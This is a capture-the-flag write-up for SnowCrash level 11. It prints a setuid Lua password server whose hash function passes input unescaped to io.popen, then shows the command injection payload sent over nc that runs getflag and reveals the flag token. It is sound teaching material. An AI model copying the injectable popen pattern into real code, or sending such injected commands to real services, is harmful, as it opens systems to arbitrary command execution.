## level 11

This level greets us with a .lua file:

```bash
level11@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
-r-x------  1 level11 level11  675 Apr  3  2012 .profile
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```

Reading the file we can see what is currently running on the `flag11` user:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

The port `5151` is open and it requests a password from us.
We it attempts to hash the given password and compare it to a hash.
The hash it gets compared to is seemingly a red herring, as cracking it would result in a nice `Gz you dumb*` response.

## Solution

After a bit of a closer inspection of the `hash` function we can see how it attempts to hash the user input:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

The user input is concatenated to an `echo` call which then gets concatenated to a pipe to the `sha1sum`.
Similar to `level04` we can escape the call to `echo` and inject our code right after it!

By ending the call to `echo` with a `;` we can then call `getflag` and send the output to our user `level11` using `write`.

So lets do just that! We connect to the server using `nc`:

```bash
level11@SnowCrash:~$ nc localhost 5151   
Password: filler; getflag | write level11; echo filler

Message from flag11@SnowCrash on (none) at X:X ...
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
EOF
Erf nope..
```

And there is our flag: `fa6v5ateaw21peobuub8ipe6s`.
